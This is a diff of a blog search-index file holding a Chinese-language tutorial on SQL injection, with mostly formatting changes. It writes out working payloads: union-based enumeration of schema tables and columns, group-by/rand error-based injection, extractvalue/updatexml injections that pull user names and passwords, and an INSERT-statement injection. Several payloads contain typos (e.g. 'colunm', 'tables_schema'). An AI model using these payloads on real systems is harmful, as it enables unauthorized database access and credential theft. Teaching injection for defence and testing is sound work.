@@ -280,21 +280,21 @@ SELECT 字段1, 字段2 FROM 表名;SELECT * FROM 表名 LIMIT 0, 1;
     <url>/2026/05/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[1. 什么是 SQL 注入SQL注入是一种常见的网络安全漏洞和攻击方式，它利用应用程序对用户输入数据的处理不当，使得攻击者能够在执行SQL查询时插入恶意的SQL代码。通过成功注入恶意代码，攻击者可以执行未经授权的数据库操作，获取敏感信息、篡改数据甚至完全破坏数据库。
 SQL 注入就是：有人在网站的输入框（比如登录框、搜索框）里，不是输正常内容，而是偷偷塞一段 SQL 数据库命令，想骗数据库执行，达到偷数据、删数据甚至改网站的目的。
-2.  SQL 注入分类常见的注入点：
+2. SQL 注入分类常见的注入点：
 ?str=xxx?test=xxx?idstr=xxx?id=xxx
 
-2.1 union 注入概念：      union查询注入是最基础的注入。在SQL中， UNION 操作符用于合并两个或多个 SELECT 语句的结果。union 查询注入利用 UNION 关键字可以追加一条或者多条额外的 SELECT 查询，并将结果追加到原始查询中。联合查询会“纵向”拼接两个或多个 SELECT 语句的结果.
-适用条件：    （1）网页存在注入点，有回显。
+2.1 union 注入概念：union查询注入是最基础的注入。在SQL中， UNION 操作符用于合并两个或多个 SELECT 语句的结果。union 查询注入利用 UNION 关键字可以追加一条或者多条额外的 SELECT 查询，并将结果追加到原始查询中。联合查询会“纵向”拼接两个或多个 SELECT 语句的结果.
+适用条件：（1）网页存在注入点，有回显。
 （2）需要满足union语句要求，即：
 union前后两个select的结果集应具有相同列数；
 union前后两个select的结果集对应列应是相同数据类型
-注入步骤：   
+注入步骤：
 首先判断是否存在注入点及注入的类型。
 
 https://地址/?id=1通过修改id的值判断是否存在注入点
 
 
-使用ORDER BY 查询列数 
+使用ORDER BY 查询列数
 
 https://地址/?id=1 order by 1修改 order by 后面的数据不报错代表存在，报错即为最大列数
 
@@ -315,7 +315,7 @@ https://地址/?id=1 order by 1修改 order by 后面的数据不报错代表存
 ?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where tables_schema=&#x27;数据库名&#x27;
 
 
-获取数据库的表中的所有字段名 
+获取数据库的表中的所有字段名
 
 ?id=-1 union select 1,2,group_concat(colunm_name) from information_schema.colunms where tables_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;
 
@@ -328,51 +328,51 @@ https://地址/?id=1 order by 1修改 order by 后面的数据不报错代表存
 union 注入要求存在注入点，有回显
 需要满足 union 语句要求
 
-2.2 报错注入概念 报错注⼊是利⽤⽹站的报错信息来带出我们想要的信息，就是在错误信息中执⾏sql语句
+2.2 报错注入概念报错注⼊是利⽤⽹站的报错信息来带出我们想要的信息，就是在错误信息中执⾏sql语句
 使⽤条件考虑到成功率和时间成本⽐union成本⾼，需要数据库有错误信息，⼀般在union条件不能实施的时候，在查询，新增，修改能都使⽤
 报错注⼊命令该部分参考：https://cloud.tencent.com/developer/article/2159753
 groupby重复键冲突利⽤count()、rand()、floor()、groupby这⼏个特定的函数结合在⼀起产⽣的注⼊漏洞
 ?id=1 and (select 1 from (select count(*),concat(0x5e,(目标查询语句),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)
 
 核心是利用 count(*) + rand() + group by 触发主键重复错误，把 concat 包裹的目标数据（如版本号、表名）带出，无需页面回显也能拿到数据（当 union 被禁用时）。
-命令解释&lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);&quot;&gt;count(*)&lt;/font&gt;统计有多少行数据，用来触发分组。
-&lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);&quot;&gt;rand(0)&lt;/font&gt;生成固定的随机数（不是真随机， predictable）
-&lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);&quot;&gt;floor(rand(0)*2)&lt;/font&gt;结果只有两个：0 或者 1
-&lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);&quot;&gt;group by x&lt;/font&gt;按 x 分组，MySQL 会建一张临时表存分组结果。
-&lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);&quot;&gt;concat(0x5e, 数据, 0x5e)&lt;/font&gt;把 版本号 &#x2F; 库名 &#x2F; 表名 拼进字符串里。
+命令解释count(*)统计有多少行数据，用来触发分组。
+rand(0)生成固定的随机数（不是真随机， predictable）
+floor(rand(0)*2)结果只有两个：0 或者 1
+group by x按 x 分组，MySQL 会建一张临时表存分组结果。
+concat(0x5e, 数据, 0x5e)把 版本号 &#x2F; 库名 &#x2F; 表名 拼进字符串里。
 
-&lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);&quot;&gt;0x5e&lt;/font&gt; &#x3D; ^ 符号，只是分隔符
+0x5e &#x3D; ^ 符号，只是分隔符
 
 为什么会报错？MySQL 做 group by 时：
 
-先算 &lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);&quot;&gt;floor(rand(0)*2)&lt;/font&gt; → 得到 0 或 1
+先算 floor(rand(0)*2) → 得到 0 或 1
 把结果插入临时表
 插入时又算了一次 rand (0)
 两次结果不一样 → 出现重复键
 直接报错：Duplicate entry（重复条目）
-关键：报错的时候，会把我们拼接的【数据】一起输出来！数据就这样拿到了。
+关键：**报错的时候，会把我们拼接的【数据】一起输出来！**数据就这样拿到了。
 
 为什么 rand (14) 更好？rand (14) 只需要 2 条数据就能触发冲突rand (0) 需要 3 条数据 才会报错。
 总结
-用 &lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);&quot;&gt;rand()&lt;/font&gt; 生成 0&#x2F;1
-用 &lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);&quot;&gt;group by&lt;/font&gt; 建临时表
+用 rand() 生成 0&#x2F;1
+用 group by 建临时表
 插入时重复计算 rand ()
 产生重复键报错
 错误信息里带出我们要的数据
 
-如何使用不懂原理知道如何使用即可，想查什么，就把 &lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);&quot;&gt;version()&lt;/font&gt; 换成：
+如何使用不懂原理知道如何使用即可，想查什么，就把 version() 换成：
 
-&lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);&quot;&gt;database()&lt;/font&gt; → 查库名
-&lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);&quot;&gt;table_name&lt;/font&gt; → 查表名
-&lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);&quot;&gt;column_name&lt;/font&gt; → 查字段
-&lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);&quot;&gt;password&lt;/font&gt; → 查数据
+database() → 查库名
+table_name → 查表名
+column_name → 查字段
+password → 查数据
 
 示例：
 ?id=1 and (select 1 from (select count(*),concat(0x5e,(select version() from information_schema.tables limit 0,1),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)
 
 把想要的数据（这里是 version()）爆在报错信息里。
 xpath报错MySQL 有两个 XML 函数：extractvalue ()、updatexml ()
-只要给它**不符合 XPath 语法的字符串，它就会报错，并把错误内容直接显示出来**。
+只要给它不符合 XPath 语法的字符串，它就会报错，并把错误内容直接显示出来。
 extractvalue()?id=1 and extractvalue(1, concat(0x5c, (查询语句), 0x5c))
 
 
@@ -396,11 +396,11 @@ updatexml() 仅能获取返回32位字符，对于长字符串需要分批次获
 &#x27; or updatexml(1,concat(0x5e,(select concat(name,&#x27;:&#x27;,substring(password,1,16)) from users limit 0,1),0x5e),1) or &#x27;&#x27; or updatexml(1,concat(0x5e,(select concat(name,&#x27;:&#x27;,substring(password,17)) from users limit 0,1),0x5e),1) or &#x27;
 
 0x5e、0x5c 是什么？
-&lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);&quot;&gt;0x5e&lt;/font&gt; → ^
-&lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);&quot;&gt;0x5c&lt;/font&gt; → __
+0x5e → ^
+0x5c → __
 
 作用：破坏 XPath 语法，强制报错。
-攻击语句INSERT INTO messages(字段1, 字段2, 字段3) VALUES (&#x27;&#x27;, &#x27;&#x27;, &#x27; 攻击语句 &#x27;); // 例如：$sql = &quot;INSERT INTO messages(`uname`,`title`,`content`) VALUES (&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27; or extractvalue(1, concat(0x5c, database(), 0x5c)) or &#x27;&#x27;)&quot;;
+攻击语句INSERT INTO messages(字段1, 字段2, 字段3) VALUES (&#x27;&#x27;, &#x27;&#x27;, &#x27; 攻击语句 &#x27;);// 例如：$sql = &quot;INSERT INTO messages(`uname`,`title`,`content`) VALUES (&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27; or extractvalue(1, concat(0x5c, database(), 0x5c)) or &#x27;&#x27;)&quot;;
 
 
 获得数据库名字
